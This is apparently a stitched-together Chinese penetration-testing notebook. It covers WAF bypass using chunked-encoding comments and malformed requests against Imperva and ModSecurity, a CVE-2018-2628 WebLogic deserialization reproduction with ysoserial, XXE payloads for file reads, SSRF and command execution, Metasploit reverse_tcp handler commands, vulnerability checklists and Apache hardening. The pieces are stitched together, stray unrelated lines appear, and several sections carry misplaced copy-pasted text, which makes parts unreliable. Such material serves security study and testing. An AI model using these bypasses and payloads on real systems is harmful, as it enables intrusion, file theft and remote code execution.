     chunk-size     = 1*HEXDIG
     last-chunk     = 1*("0") [ chunk-ext ] CRLF

     chunk-data     = 1*OCTET ; a sequence of chunk-size octets

   The chunk-size field is a string of hex digits indicating the size of
   the chunk-data in octets.  The chunked transfer coding is complete
   when a chunk with a chunk-size of zero is received, possibly followed
   by a trailer, and finally terminated by an empty line.

   A recipient MUST be able to parse and decode the chunked transfer
   coding.

4.1.1.  Chunk Extensions

   The chunked encoding allows each chunk to include zero or more chunk
   extensions, immediately following the chunk-size, for the sake of
   supplying per-chunk metadata (such as a signature or hash),
   mid-message control information, or randomization of message body
   size.

     chunk-ext      = *( ";" chunk-ext-name [ "=" chunk-ext-val ] )

     chunk-ext-name = token
     chunk-ext-val  = token / quoted-string

   The chunked encoding is specific to each connection and is likely to
   be removed or recoded by each recipient (including intermediaries)
   before any higher-level application would have a chance to inspect
   the extensions.  Hence, use of chunk extensions is generally limited
```

通过阅读规范发现分块传输可以在长度标识处加上分号“;”作为注释，如：

```
9;kkkkk
1234567=1
4;ooo=222
2345
0
(两个换行)
```

几乎所有可以识别Transfer-Encoding数据包的WAF，都没有处理分块数据包中长度标识处的注释，导致在分块数据包中加入注释的话，WAF就识别不出这个数据包了。

现在我们在使用了Imperva应用防火墙的网站测试常规的分块传输数据包：

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1
d
9
&a=1    and    
3
2=2
0
（两个换行）
```

返回的结果如下图所示。

[![img](https://p0.ssl.qhimg.com/dm/1024\_509\_/t01e68aae3729de0934.png)](https://p0.ssl.qhimg.com/dm/1024\_509\_/t01e68aae3729de0934.png)

可以看到我们的攻击payload “and 2=2”被Imperva的WAF拦截了。

这时我们将分块传输数据包加入注释符。

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1;testsdasdsad
d
9;test
&a=1    and    
3;test44444
2=2
0
(两个换行)
```

返回的结果如下图所示。

[![img](https://p1.ssl.qhimg.com/dm/1024\_512\_/t016a21d39c2ed6911a.png)](https://p1.ssl.qhimg.com/dm/1024\_512\_/t016a21d39c2ed6911a.png)

可以看到Imperva已经不拦截这个payload了。

### 技巧2 Bypass ModSecurity

众所周知ModSecurity是加载在中间件上的插件，所以不需要理会解析http数据包的问题，因为中间件已经帮它处理完了，那么无论使用常规的分块还是加了注释的分块数据包，ModSecurity都能直接获取到完整的http数据包然后匹配危险关键字，所以一些基于ModSecurity做的WAF产品难道就不受影响吗？

接下来我们在Apache+ModSecurity环境做测试。

sql.php代码如下：

```
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL);
$con = mysql_connect("localhost","root","");
if (!$con)
{
    die('Could not connect: ' . mysql_error());
}
mysql_select_db("test", $con);
$id = $_REQUEST["id"];
$sql = "select * from user where id=$id";
$result = mysql_query($sql,$con);
while($row = mysql_fetch_array($result))
{
    echo $row['name'] . " " . $row['password']."n";
}
mysql_close($con);
print "========GET==========n";
print_r($_GET);
print "========POST==========n";
print_r($_POST);
?>
<a href="sqli.php?id=1"> sdfsdf </a>
```

ModSecurity加载的规则拦截了请求包中的关键字“union”。

下面我们的请求和返回结果如下：

```
请求:
http://10.10.10.10/sql.php?id=2%20union

返回:
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /sql.php was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

可以看到我们的“union”关键字被拦截了。

接下来我们传输一个畸形的分块数据包看看。

```
请求:
POST /sql.php?id=2%20union HTTP/1.1
......
Transfer-Encoding: chunked

1
aa
0
(两个换行)


返回:
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
========GET==========
Array
(
   [id] => 2 union
)
========POST==========
Array
(
)
```

可以看到虽然apache报错了，但是因为apache容错很强，所以我们提交的参数依然传到了php，而我们的ModSecurity并没有处理400错误的数据包，最终绕过了ModSecurity。

接下来我们把ModSecurity的规则改为过滤返回数据中包含“root”的字符串，然后在sql.php脚本中加入打印“root”关键字的代码。

接着我们做如下测试：

```
请求：
http://10.10.10.10/sql.php?id=1

返回:
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /sql.php
on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

因为sql.php脚本中返回了带有“root”的关键字，所以直接就被ModSecurity拦截了。这时我们改为发送畸形的分块数据包。

```
请求:
POST /sql.php?id=1 HTTP/1.1
Host: 10.10.10.10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 16

3
123
1
0
(两个换行)


返回:
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
root 123456
========GET==========
Array
(
   [id] => 1
)
========POST==========
Array
(
)
```

通过两个测试可以发现使用畸形的分块数据包可以直接绕过ModSecurity的检测。这个问题我们在2017年4月已提交给ModSecurity官方，但是因为种种问题目前依然未修复。

***

## CVE-2018-2628 简单复现与分析

xxlegend 廖新喜 _2018-04-18_

### 综述

当地时间4月17日，北京时间4月18日凌晨，Oracle官方发布了4月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic反序列化漏洞(CVE-2018-2628)，这个漏洞是我在去年11月份报给Oracle的，通过该漏洞，攻击者可以在未授权的情况下远程执行任意代码。

参考链接：

**http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html**

### 漏洞影响范围

* Weblogic 10.3.6.0
* Weblogic 12.1.3.0
* Weblogic 12.2.1.2
* Weblogic 12.2.1.3

**复现：**

第一步发送测试PoC，PoC中远程连接的服务器地址就是第二步中所使用的服务器，攻击的ip是192.168.3.103的7001端口上的T3服务，该服务会解包Object结构，通过一步步的readObject去第二步服务器上的1099端口请求恶意封装的代码，然后在本地弹出计算器。

![图片](https://mmbiz.qpic.cn/mmbiz\_png/gtnOBNOdtScbco9icsS7RKrhpD9icU2zIub8LLqoP1ff9ZbQyp2HRO3haJgravKdglW6cVr1zrvHkv4BOM4Kbdhg/640?wx\_fmt=png\&tp=webp\&wxfrom=5\&wx\_lazy=1\&wx\_co=1)

第二步在远程服务器上启用ysoserial.exploit.JRMPListener，JRMPListener会将含有恶意代码的payload发送回请求方。

![图片](https://mmbiz.qpic.cn/mmbiz\_png/gtnOBNOdtScbco9icsS7RKrhpD9icU2zIu2DicDKjvbmd1dv4wStVDjPZsIVdb0VEgkFq9ibCjq8LwBianxOYibiabzzg/640?wx\_fmt=png\&tp=webp\&wxfrom=5\&wx\_lazy=1\&wx\_co=1)

查看weblogic的日志，可以看到如下错误，此时已经弹出计算器：

![图片](https://mmbiz.qpic.cn/mmbiz\_png/gtnOBNOdtScbco9icsS7RKrhpD9icU2zIuvwmkb8NQVFdlvQPGBnXXd3qmcE6XzeunvBwYbLBTgqtRgFfuJzhIicQ/640?wx\_fmt=png\&tp=webp\&wxfrom=5\&wx\_lazy=1\&wx\_co=1)

**分析：**

Weblogic已经将互联网暴露的PoC都已经加入了黑名单，如果要绕过他的黑名单的限制就只能自己动手构造。来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。

protected Class\<?> resolveProxyClass(String\[] interfaces) throws IOException, ClassNotFoundException { String\[] arr$ = interfaces; int len$ = interfaces.length;

for(int i$ = 0; i$ < len$; ++i$) { String intf = arr$\[i$]; if(intf.equals("java.rmi.registry.Registry")) { throw new InvalidObjectException("Unauthorized proxy deserialization"); } }

return super.resolveProxyClass(interfaces); }

其实核心部分就是JRMP（Java Remote Methodprotocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。

披露时间线：

2017/7/19：发现问题

2017/11/23：报告给Oracle官方

2017/11/29：Oracle官方接收

2017/11/30：Oracle官方分配bug号(S0947640)，正式进入主线版本修复

2017/11/30：索要公司域名邮箱

2018/4/14：分配CVE，CVE-2018-2628

2018/4/17：发布补丁

***

### 4.10.3. XXE

当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。

### 4.10.4. 攻击方式

#### 4.10.4.1. 拒绝服务攻击

```
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。

#### 4.10.4.2. 文件读取

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

#### 4.10.4.3. SSRF

```
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
```

#### 4.10.4.4. RCE

```
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

#### 4.10.4.5. XInclude

```
<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
```

***

## 4.13. 逻辑漏洞 / 业务漏洞

### 4.13.1. 简介

逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。

在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。

### 4.13.2. 安装逻辑

* 查看能否绕过判定重新安装
* 查看能否利用安装文件获取信息
* 看能否利用更新功能获取信息

### 4.13.3. 交易

#### 4.13.3.1. 购买

* 修改支付的价格
* 修改支付的状态
* 修改购买数量为负数
* 修改金额为负数
* 重放成功的请求
* 并发数据库锁处理不当

#### 4.13.3.2. 业务风控

* 刷优惠券
* 套现

### 4.13.4. 账户

#### 4.13.4.1. 注册

* 覆盖注册
* 尝试重复用户名
* 注册遍历猜解已有账号

#### 4.13.4.2. 密码

* 密码未使用哈希算法保存

#### 4.13.4.3. 邮箱用户名

* 前后空格
* 大小写变换

#### 4.13.4.4. Cookie

* 包含敏感信息
* 未验证合法性可伪造

#### 4.13.4.5. 手机号用户名

* 前后空格
* \+86

#### 4.13.4.6. 登录

* 撞库
* 账号劫持
* 恶意尝试帐号密码锁死账户

#### 4.13.4.7. 找回密码

* 重置任意用户密码
* 密码重置后新密码在返回包中
* Token验证逻辑在前端
* X-Forwarded-Host处理不正确

#### 4.13.4.8. 修改密码

* 越权修改密码
* 修改密码没有旧密码验证

#### 4.13.4.9. 申诉

* 身份伪造
* 逻辑绕过

#### 4.13.4.10. 更新

* ORM更新操作不当可更新任意字段
* 权限限制不当可以越权修改

#### 4.13.4.11. 信息查询

* 权限限制不当可以越权查询
* 用户信息ID可以猜测导致遍历

### 4.13.5. 2FA

* 重置密码后自动登录没有2FA
* OAuth登录没有启用2FA
* 2FA可爆破
* 2FA有条件竞争
* 修改返回值绕过
* 激活链接没有启用2FA
* 可通过CSRF禁用2FA

### 4.13.6. 验证码

* 验证码可重用
* 验证码可预测
* 验证码强度不够
* 验证码无时间限制或者失效时间长
* 验证码无猜测次数限制
* 验证码传递特殊的参数或不传递参数绕过
* 验证码可从返回包中直接获取
* 验证码不刷新或无效
* 验证码数量有限
* 验证码在数据包中返回
* 修改Cookie绕过
* 修改返回包绕过
* 验证码在客户端生成或校验
* 验证码可OCR或使用机器学习识别
* 验证码用于手机短信/邮箱轰炸

### 4.13.7. Session

* Session机制
* Session猜测 / 爆破
* Session伪造
* Session泄漏
* Session Fixation

### 4.13.8. 越权

* 未授权访问
*
  *   水平越权

      攻击者可以访问与他拥有相同权限的用户的资源权限类型不变，ID改变
*
  *   垂直越权

      低级别攻击者可以访问高级别用户的资源权限ID不变，类型改变
*
  *   交叉越权

      权限ID改变，类型改变

### 4.13.9. 随机数安全

* 使用不安全的随机数发生器
* 使用时间等易猜解的因素作为随机数种子

### 4.13.10. 其他

- 用户/订单/优惠券等ID生成有规律，可枚举
- 接口无权限、次数限制
- 加密算法实现误用
- 执行顺序
- 敏感信息泄露
- ***

***

## 4.14. 配置安全

*
  *   弱密码

      位数过低字符集小为常用密码个人信息相关手机号生日姓名用户名使用键盘模式做密码
*
  *   敏感文件泄漏

      .git.svn
*
  *   数据库

      Mongo/Redis等数据库无密码且没有限制访问
*
  *   加密体系

      在客户端存储私钥
*
  *   三方库/软件

      公开漏洞后没有及时更新

***

中间件

* 4.15.1. IIS
  * [4.15.1.1. IIS 6.0](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#iis-6-0)
  * [4.15.1.2. IIS 7.0-7.5 / Nginx <= 0.8.37](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#iis-7-0-7-5-nginx-0-8-37)
  * [4.15.1.3. PUT漏洞](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#put)
  * [4.15.1.4. Windows特性](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#windows)
  * [4.15.1.5. 文件名猜解](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#id1)
  * [4.15.1.6. 参考链接](https://websec.readthedocs.io/zh/latest/vuln/middleware/iis.html#id2)
* 4.15.2. Apache
  * [4.15.2.1. 后缀解析](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#id1)
  * [4.15.2.2. .htaccess](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#htaccess)
  * [4.15.2.3. 目录遍历](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#id2)
  * [4.15.2.4. CVE-2017-15715](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#cve-2017-15715)
  * [4.15.2.5. lighttpd](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#lighttpd)
  * [4.15.2.6. 参考链接](https://websec.readthedocs.io/zh/latest/vuln/middleware/apache.html#id3)
* 4.15.3. Nginx
  * [4.15.3.1. Fast-CGI关闭](https://websec.readthedocs.io/zh/latest/vuln/middleware/nginx.html#fast-cgi)
  * [4.15.3.2. Fast-CGI开启](https://websec.readthedocs.io/zh/latest/vuln/middleware/nginx.html#id1)
  * [4.15.3.3. CVE-2013-4547](https://websec.readthedocs.io/zh/latest/vuln/middleware/nginx.html#cve-2013-4547)
  * [4.15.3.4. 配置错误](https://websec.readthedocs.io/zh/latest/vuln/middleware/nginx.html#id2)
  * [4.15.3.5. 参考链接](https://websec.readthedocs.io/zh/latest/vuln/middleware/nginx.html#id5)

***

信息搜集

## 3.3. 端口信息

### 3.3.1. 常见端口及其脆弱点

*
  *   FTP (21/TCP)

      默认用户名密码 `anonymous:anonymous`暴力破解密码VSFTP某版本后门
*
  *   SSH (22/TCP)

      部分版本SSH存在漏洞可枚举用户名暴力破解密码
*
  *   Telent (23/TCP)

      暴力破解密码嗅探抓取明文密码
*
  *   SMTP (25/TCP)

      无认证时可伪造发件人
*
  *   DNS (53/UDP)

      域传送漏洞DNS劫持DNS缓存投毒DNS欺骗SPF / DMARC CheckDDoSDNS Query FloodDNS 反弹DNS 隧道
*
  *   DHCP 67/68

      劫持/欺骗
* TFTP (69/TCP)
* HTTP (80/TCP)
*
  *   Kerberos (88/TCP)

      主要用于监听KDC的票据请求用于进行黄金票据和白银票据的伪造
*
  *   POP3 (110/TCP)

      爆破
*
  *   RPC (135/TCP)

      wmic 服务利用
*
  *   NetBIOS (137/UDP & 138/UDP)

      未授权访问弱口令
*
  *   NetBIOS / Samba (139/TCP)

      未授权访问弱口令
*
  *   SNMP (161/TCP)

      Public 弱口令
*
  *   LDAP (389/TCP)

      用于域上的权限验证服务匿名访问注入
* HTTPS (443/TCP)
*
  *   SMB (445/TCP)

      Windows 协议簇，主要功能为文件共享服务`net use \\192.168.1.1 /user:xxx\username password`
*
  *   Linux Rexec (512/TCP & 513/TCP & 514/TCP)

      弱口令
*
  *   Rsync (873/TCP)

      未授权访问
*
  *   RPC (1025/TCP)

      NFS匿名访问
*
  *   Java RMI (1090/TCP & 1099/TCP)

      反序列化远程命令执行漏洞
*
  *   MSSQL (1433/TCP)

      弱密码差异备份 GetShellSA 提权
*
  *   Oracle (1521/TCP)

      弱密码
*
  *   NFS (2049/TCP)

      权限设置不当`showmount <host>`
*
  *   ZooKeeper (2171/TCP & 2375/TCP)

      无身份认证
*
  *   Docker Remote API (2375/TCP)

      未限制IP / 未启用TLS身份认证`http://docker.addr:2375/version`
*
  *   MySQL (3306/TCP)

      弱密码日志写WebShellUDF提权MOF提权
*
  *   RDP / Terminal Services (3389/TCP)

      弱密码
*
  *   Postgres (5432/TCP)

      弱密码执行系统命令
*
  *   VNC (5900/TCP)

      弱密码
*
  *   CouchDB (5984/TCP)

      未授权访问
*
  *   WinRM (5985/TCP)

      Windows对WS-Management的实现在Vista上需要手动启动，在Windows Server 2008中服务是默认开启的
*
  *   Redis (6379/TCP)

      无密码或弱密码绝对路径写 WebShell计划任务反弹 Shell写 SSH 公钥主从复制 RCEWindows 写启动项
*
  *   Kubernetes API Server (6443/TCP && 10250/TCP)

      `https://Kubernetes:10250/pods`
*
  *   JDWP (8000/TCP)

      远程命令执行
* ActiveMQ (8061/TCP)
*
  *   Jenkin (8080/TCP)

      未授权访问
*
  *   Elasticsearch (9200/TCP)

      代码执行`http://es.addr:9200/_plugin/head/``http://es.addr:9200/_nodes`
*
  *   Memcached (11211/TCP)

      未授权访问
* RabbitMQ (15672/TCP & 15692/TCP & 25672/TCP)
*
  *   MongoDB (27017/TCP)

      无密码或弱密码
*
  *   Hadoop (50070/TCP & 50075/TCP)

      未授权访问

除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞

### 3.3.2. 常见端口扫描技术

#### 3.3.2.1. 全扫描

扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。

全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。

#### 3.3.2.2. 半扫描

半扫描也称SYN扫描，在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且现在的大部分防火墙已经开始对这种扫描方式做处理。

#### 3.3.2.3. FIN扫描

FIN扫描是向目标发送一个FIN数据包，如果是开放的端口，会返回RST数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。

这种方式并不在TCP三次握手的状态中，所以不会被记录，相对SYN扫描要更隐蔽一些。

### 3.3.3. Web服务

*
  *   Jenkins

      未授权访问
*
  *   Gitlab

      对应版本CVE
*
  *   Zabbix

      权限设置不当

### 3.3.4. 批量搜索

* Censys
* Shodan
* ZoomEye

***

## 3.4. 站点信息

*
  *   判断网站操作系统

      Linux大小写敏感Windows大小写不敏感
*
  *   扫描敏感文件

      robots.txtcrossdomain.xmlsitemap.xmlxx.tar.gzxx.bak等
*
  *   确定网站采用的语言

      如PHP / Java / Python等找后缀，比如php/asp/jsp
*
  *   前端框架

      如jQuery / BootStrap / Vue / React / Angular等查看源代码
*
  *   中间服务器

      如 Apache / Nginx / IIS 等查看header中的信息根据报错信息判断根据默认页面判断
*
  *   Web容器服务器

      如Tomcat / Jboss / Weblogic等
*
  *   后端框架

      根据Cookie判断根据CSS / 图片等资源的hash值判断根据URL路由判断如wp-admin根据网页中的关键字判断根据响应头中的X-Powered-By
*
  *   CDN信息

      常见的有Cloudflare、yunjiasu
*
  *   探测有没有WAF，如果有，什么类型的

      有WAF，找绕过方式没有，进入下一步
*
  *   扫描敏感目录，看是否存在信息泄漏

      扫描之前先自己尝试几个的url，人为看看反应
* 使用爬虫爬取网站信息
* 拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
*
  *   常见入口目标

      关注度低的系统业务线较长的系统

純粹理性批判 pdf

不管是《黑天鹅》中的妮娜，还是《小欢喜》

***

#### 业务测试点

1. xff头绕过短信发送频率限制
2. HTTP 盲攻击
3. Fuzz逻辑越权
4. XXE
5.  登录认证

    > * 暴力破解
    >
    > <details>
    >
    > <summary>本地加密传输</summary>
    >
    >
    >
    > </details>

查看数据是否采用SSL加密方式,是否可破解Wireshark抓包查看数据整改建议: 部署有效的SSL证书> >

<details>

<summary>Session测试</summary>

会话固定测试

检查用户退出后session能否重复使用利用:诱骗用户使用攻击者固定会话进行登录,窃取认证信息记录两次登录后的session,比较是否相同,相同则为固定session客户端登录系统时判断是否提交留存session认证,如果是留存session需要及时销毁并重新生成session认证

会话注销

检查用户退出后session是否依然有效,授权未释放利用: 如果未清空的session可以持续有效,攻击者可以获取用户权限sessionID销毁后未能清空服务器存储的session整改建议:用户注销或退出时,服务器应及时销毁session认证会话信息并清空客户端session标识

会话超时

检查用户10分钟无操作时,session是否被销毁并要求重新认证整改建议: 对session认证配置声明周期(常规业务系统建议30分钟内)

</details>

\> >

<details>

<summary>Cookie仿冒</summary>

修改Cookie身份标识,并拥有相关用户的权限通过篡改身份认证标识值来判断能否改变用户身份会话整改建议: 客户端标识的用户敏感信息数据,使用session会话认证方式,避免被仿冒

</details>

\> >

<details>

<summary>密文比对认证</summary>

检查密码是通过前端加密后和数据库比对,还是后端加密比对如果是前端加密啊,找到加密方式可以对用户名密码进行爆破整改建议: 将密码加密过程和比对过程放置在服务器后台执行

</details>

\> >

<details>

<summary>登录失败信息测试</summary>

查看登录失败后回显的信息提示比如:“用户名不存在”,“密码错误”,“账号不存在”等明确信息整改建议: 系统登录失败提示模糊描述

</details>

6\. 业务模块

> <details>
>
> <summary>订单ID篡改测试</summary>
>
>
>
> </details>

未考虑用户间权限隔离问题时,就会导致平行越权通过修改id,获取其他用户信息整改建议: 敏感数据要通过session机制判断用户身份,做好平行权限控制.服务端要交验请求的数据是否和登录者的身份一致,如果不一致则拒绝请求> >

<details>

<summary>手机号码篡改</summary>

篡改手机号越权没有身份校验时,抓包篡改手机号(挂失/找回密码),来越权获取信息整改建议: 服务端需要交验手机号和登录者的身份是否一致

</details>

\> >

<details>

<summary>用户ID篡改</summary>

同订单id篡改一样

</details>

\> >

<details>

<summary>邮箱和用户篡改</summary>

篡改发件人参数,导致攻击者可以伪造发信人进行钓鱼整改建议: 写信、发消息、发邮件要判断用户身份

</details>

\> >

<details>

<summary>商品编号/金额篡改</summary>

篡改商品价格或编号编号与价格不对应,1分钱成交整改建议: 商品金额不在客户端传入,防止被篡改,如果需要客户端传入金额,则服务端需要检查商品价格和交易金额是否一致,或对支付金额做签名校验

</details>

\> >

<details>

<summary>条件竞争</summary>

利用数据库时间差,多次重放数据整改建议: 在处理订单、支付等关键业务时,使用悲观锁或乐观锁保证事物的ACID特性(原子性,一致性,隔离性,持久性),避免数据脏读

</details>

1.  授权访问

    > <details>
    >
    > <summary>未授权访问</summary>
    >
    >
    >
    > </details>

查看未授权可以访问的页面整改建议: 需要安全配置或权限认证的地址、授权页面存在缺陷.对用户身份做session认证,并对用户访问的url做身份鉴别> >

<details>

<summary>越权</summary>

水平越权和垂直越权水平: A登录后篡改为B身份访问B的信息,垂直: 篡改为管理员整改建议: 服务端需要交验身份唯一性,自己的身份智能增删改查自己的信息

</details>

8\. 输入/输出模块测试 >

<details>

<summary>SQL注入测试</summary>

查看数据是否采用SSL加密方式,是否可破解Wireshark抓包查看数据整改建议: 部署有效的SSL证书

</details>

\> >

<details>

<summary>XSS测试</summary>

查看数据是否采用SSL加密方式,是否可破解Wireshark抓包查看数据整改建议: 部署有效的SSL证书

</details>

\> >

<details>

<summary>命令执行</summary>

查看数据是否采用SSL加密方式,是否可破解Wireshark抓包查看数据整改建议: 部署有效的SSL证书

</details>

9\. 回退测试 10. 验证码机制 > - 爆破 > - 重复使用 > - 客户端回显 > - 验证码绕过 > - 验证码识别 11. 数据安全 >

<details>

<summary>订单篡改</summary>

在支付页面,篡改支付金额整改建议: 商品信息、金额、折扣等原始数据的校验应来自服务器

</details>

\> >

<details>

<summary>本地加密传输</summary>

提交异常数量的订单支付请求整改建议: 服务端对产生异常情况的交易行为(积分为负 库存为0)应直接予以限制、阻断

</details>

\> > - 前端js限制绕过 > - 请求重放 > - 业务上限测试 12. 业务流程乱序测试 > - 针对业务处理流程是否正常.没有绕过 e.g.: 未经支付,直接充值成功 13. 密码找回 > - 验证码客户端回显 > - 验证码爆破 > - 接口参数账号修改 (任意账号密码修改的漏洞) > - response状态值修改测试 (修改响应结果) > - session覆盖 (任意密码找回) > > 1. 准备自己的账号接收短信 > > 2. 获得凭证进入密码重置 > > 3. 在浏览器新标签中打开找回密码页面,输入目标手机号 > > 4. 当前session账号已经被覆盖,重新回到第二步打开重置密码 > - 弱token (任意密码找回 漏洞, 找token规律, ) > - 密码找回流程绕过 (搜集 账号、凭证校验、重置的三个接口,第一步跳第三部)

***

业务风险点

1.  账号安全

    > 账号密码暴漏
    >
    > 无限制登录任意账号
    >
    > 电子邮件账号泄漏
    >
    > 中间人攻击
    >
    > 撞库攻击

    ***

    > 整改方法:
2.  密码找回

    > 密码找回凭证爆破
    >
    > 密码找回凭证回显
    >
    > > 密码找回凭证在请求链接中
    > >
    > > 加密验证字符串回显
    > >
    > > 网页源码泄漏密保
    > >
    > > 短信验证码回显
    >
    > 密码重置链接弱Token
    >
    > > 使用时间戳的md5作为密码重置token
    > >
    > > 使用服务器时间作为密码重置token
    >
    > 密码重置凭证与用户账户关联不严
    >
    > > 使用短信验证码找回密码
    > >
    > > 使用邮箱Token找回密码
    >
    > 重新绑定用户手机或邮箱
    >
    > > 重新绑定用户手机
    > >
    > > 重新绑定用户邮箱
    >
    > 服务端验证逻辑缺陷
    >
    > > 删除参数绕过验证
    > >
    > > 邮箱地址可被操控
    > >
    > > 身份验证步骤可被绕过
    >
    > 在本地验证服务端返回信息-修改返回包绕过验证
    >
    > 注册覆盖——已存在用户可被重复注册
    >
    > session覆盖——session覆盖重置他人密码

    ***

    > 整改方法
3.  越权访问

    > 平行越权
    >
    > > 查看其他用户信息
    >
    > 纵向越权
    >
    > > 权限提升

    ***

    > 整改方法
4.  OAuth2.0 安全问题

    > Oauth2.0 漏洞

    ***

    > 整改方法
5.  在线支付

    > 订单金额篡改
    >
    > 数量篡改
    >
    > 请求重放测试
    >
    > 其他参数干扰

    ***

    > 整改方法
6.  文件上传

    > 文件上传回显错误路径
7.  文件包含

    > 文件包含数据读取

***

重点关注: Spring Boot Actuator 未授权访问 远程代码执行

***

***

工具

searchsploit -t Apache

curl -v -X PUT -d "test"

Prompt(1)

msf 宏病毒文件

search meterpreter/reverse\_tcp

use osx/x64/meterpreter/reverse\_tcp

use exploit/multi/handler

set payload osx/x64/meterpreter/reverse\_tcp

set lhost 127.0.0.1

exploit

***

中间件CGI容器

​ IIS ASP.NET

​ tomcat

​ apache

​ jboss

​ weblogic

AXIS service

***

####

***

### apache 加固

1

```
* [安全运维中基线检查的自动化之ansible工具巧用](https://bbs.ichunqiu.com/thread-46896-1-1.html?from=snew
```

**1，\***_**Apache\***_**低权限用户启动**

```
vi /etc/httpd/conf/httpd.conf

User apache
Group apache
```

**2，目录遍历漏洞**

```
vi /etc/httpd/conf/httpd.conf

Options Indexes FollowSymLinks
改为：
Options FollowSymLinks
```

**3，关闭版本号显示**

```
vi /etc/httpd/conf/httpd.conf

ServerTokens Prod
ServerSignature Off
```

**4，** **上传目录禁止执行**

如果web应用确实需要支持文件上传功能，应在配置文件里面限制上传目录无脚本执行权限。假设上传目录绝对路径为”/var/www/html/upload”，配置示例如下：

```
<Directory "/var/www/html/upload">
    AllowOverride None
    <Files ~ "\.php">
        Order Allow,Deny
        Deny from all
   </Files>
   ....
</Directory>
```

**5，PHP解析设置**

默认配置下**Apache**会将类似 .php.abc 扩展名的文件作为 php 脚本来处理，攻击者常利用文件上传结合这种机制来上传 WebShell 脚本。通过修改 httpd.conf 中的如下配置，可以有效避免这个问题。

修改前配置：

```
AddType application/x-httpd-php .php
AddType application/x-httpd-php-source .phps
```

修改后配置：

```
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch "\.phps$">
    SetHandler application/x-httpd-php-source
</FilesMatch>
```

**6，禁用 CGI**

修改 httpd.conf 配置文件，注释相关模块及配置：

```
#LoadModule cgi_module modules/mod_cgi.so
#ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
#<Directory "/var/www/cgi-bin">
#    AllowOverride None
#    Options None 
#    Order allow,deny
#    Allow from all
#</Directory>
```

**7. 自定义错误页面**

修改 httpd.conf 配置文件，修改或添加以下内容：

```
ErrorDocument 500 /errorhtml
ErrorDocument 404 /error.html
ErrorDocument 403 /error.html
```

**8. 关闭 Trace**

